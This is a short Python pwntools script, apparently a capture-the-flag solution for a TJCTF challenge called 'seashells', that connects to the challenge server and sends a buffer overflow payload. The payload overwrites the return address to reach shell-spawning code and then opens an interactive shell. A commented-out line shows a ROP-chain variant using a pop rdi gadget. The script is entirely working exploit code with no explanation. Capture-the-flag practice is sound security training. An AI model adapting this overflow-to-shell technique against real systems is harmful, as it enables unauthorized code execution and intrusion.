# RazviOverflow	
# Python3

from pwn import *

#binary = process("seashells")
binary = remote("p1.tjctf.org", 8009)

shell_function_address = 0x4006c7
#pop_rdi = 0x400803
str_bin_sh = 0x004006e3


print(binary.recvuntil(b"?"))

#payload = b"A" * 0xa + b"b" * 8 + p64(pop_rdi) + p64(0xdeadcafebabebeef) + p64(shell_function_address)
payload = b"A" * 0xa + b"b" * 8 + p64(str_bin_sh) 

binary.sendline(payload)

#print(binary.recvall())
binary.interactive()
